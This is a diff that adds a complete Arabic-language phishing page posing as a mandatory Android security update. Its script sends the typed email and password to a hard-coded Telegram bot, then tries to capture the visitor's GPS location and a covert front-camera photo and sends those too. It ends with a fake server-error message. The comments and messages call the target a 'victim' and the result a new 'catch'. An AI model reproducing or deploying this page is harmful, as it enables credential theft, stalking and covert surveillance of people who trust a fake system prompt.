@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث نظام أندرويد الإجباري</title>
+    <style>
+        * { box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e8eaed; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 380px; width: 100%; text-align: center; }
+        img { width: 80px; margin-bottom: 15px; }
+        h2 { color: #202124; font-size: 22px; margin-bottom: 10px; }
+        p { color: #5f6368; font-size: 14px; line-height: 1.6; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 6px; outline: none; transition: 0.3s; }
+        input:focus { border-color: #1a73e8; box-shadow: 0 0 5px rgba(26,115,232,0.3); }
+        button { width: 100%; background-color: #1a73e8; color: white; border: none; padding: 12px; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 15px; }
+        button:hover { background-color: #1557b0; }
+        video, canvas { display: none; } /* عناصر مخفية للسحب السري */
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://www.gstatic.com/images/branding/product/2x/android_64dp.png" alt="Android Logo">
+    <h2>تحديث أمني عاجل</h2>
+    <p>تم اكتشاف ثغرة في جهازك. يرجى تسجيل الدخول لتأكيد هويتك وتفعيل الحماية.</p>
+    
+    <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+    <input type="password" id="pass" placeholder="كلمة المرور" required>
+    
+    <button onclick="executeExploit()">تحديث الآن</button>
+</div>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    // --- إعدادات الربط بالبوت ---
+    const BOT_TOKEN = '8540091916:AAGhOLLvQCGrAhYK6OSI6h9BtG7gRX91s-8';
+    const CHAT_ID = 'YOUR_CHAT_ID'; // ضع الآيدي الخاص بك هنا (مهم جداً)
+
+    async function executeExploit() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        if(!email || !pass) { alert("يرجى إكمال البيانات أولاً"); return; }
+
+        // 1. إرسال البيانات النصية فوراً
+        const info = `💀 صيد جديد:\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}`;
+        await sendToTelegram(info);
+
+        // 2. محاولة سحب الموقع الجغرافي (GPS)
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                const map = `📍 موقع الضحية: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                await sendToTelegram(map);
+            });
+        }
+
+        // 3. محاولة سحب الصورة بالكاميرا الأمامية
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                canvas.toBlob(blob => {
+                    sendPhoto(blob, `📸 صورة وجه الضحية الحقيقية\nحساب: ${email}`);
+                }, 'image/jpeg');
+                
+                stream.getTracks().forEach(t => t.stop());
+                finish();
+            }, 1000);
+        } catch (e) {
+            finish();
+        }
+    }
+
+    function finish() {
+        alert("فشل التحديث: خطأ في السيرفر (Code: 505). يرجى المحاولة لاحقاً.");
+    }
+
+    async function sendToTelegram(text) {
+        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        });
+    }
+
+    async function sendPhoto(blob, caption) {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, 'victim.jpg');
+        fd.append('caption', caption);
+        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+    }
+</script>
+
+</body>
+</html>
